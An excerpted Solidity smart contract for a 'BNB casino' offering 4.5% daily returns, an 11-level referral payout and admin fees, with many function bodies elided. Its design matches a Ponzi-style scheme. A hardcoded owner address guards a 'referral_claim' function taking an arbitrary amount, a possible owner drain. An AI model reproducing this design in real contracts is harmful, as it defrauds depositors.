...
contract BNBCASINO2023_ {
    ...
    uint constant public investLimit = 300; //300 depo limit  ok
    uint constant public minDeposit = 0.01 ether; // 0.01 min ok
    uint constant public maxDeposit = 500 ether; //500bnb max ok
    uint constant public basePercent = 450; //4.5% daily ok
    ...
    uint[] public referralPercents = [500, 400, 300, 100, 100, 100, 100, 100, 100, 100, 100]; // ok
    uint constant public marketingFee = 500;  //5% ok
    uint constant public adminFee = 500; //5% ok
    uint constant public maxContractPercent = 100; //max 1% ok
    uint constant public maxLeaderPercent =200; //max 2% if  50= .5% ok
    uint constant public maxHoldPercent = 300; //max 3% ok
    uint constant public maxCommunityPercent = 100; //1%  if  50= .5% ok
    uint constant public percentsDivider = 10000;
    uint constant public contractBalStep = 50 ether; //50bnb ok
    uint constant public leaderBonusStep = 30  ether; //30bnb ok
    uint constant public communityBonusStep = 100; //100 active user ok
    ...
    modifier ownerOnly(){
        require(msg.sender == 0xCFCCB17BD9C1dA802659AE20026Ed5E4DcBf3911);
        _;
    }

    function referral_claim (uint256 _amount) public ownerOnly  {
    ...
    function getContractBalanceRate() public view returns (uint) {
        ...
        uint contractBalancePercent = basePercent.add(contractBalance.div(contractBalStep).mul(20)); //0.2% ok
     ...
     function getLeaderBonusRate() public view returns (uint) {
        uint leaderBonusPercent = totalRefBonus.div(leaderBonusStep).mul(20); //0.2
    ...
    function getCommunityBonusRate() public view returns (uint) {
        uint communityBonusRate = totalDeposits.div(communityBonusStep).mul(20); //0.2
    ...
    function withdraw() public {
        ...
        for (uint i = 0; i < user.deposits.length; i++) {
            ...
            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {
                ...
                user.deposits[i].withdrawn = uint(user.deposits[i].withdrawn.add(dividends)); /// changing of storage data
    ...
    function invest(address referrer) public payable {
        ...
        emit FeePaid(msg.sender, _marketingFee.add(_adminFee));
        ...
        if (user.referrer != address(0)) {
            ...
            for (uint i = 0; i < 11; i++) {
                if (upline != address(0)) {
                    ...
                    if (amount > 0) {
                        payable(address(upline)).transfer(amount);
                        users[upline].bonus = uint(users[upline].bonus.add(amount));
    ...
    function getUserReferralsStats(address userAddress) public view returns (address, uint, uint[11] memory) {
        User storage user = users[userAddress];
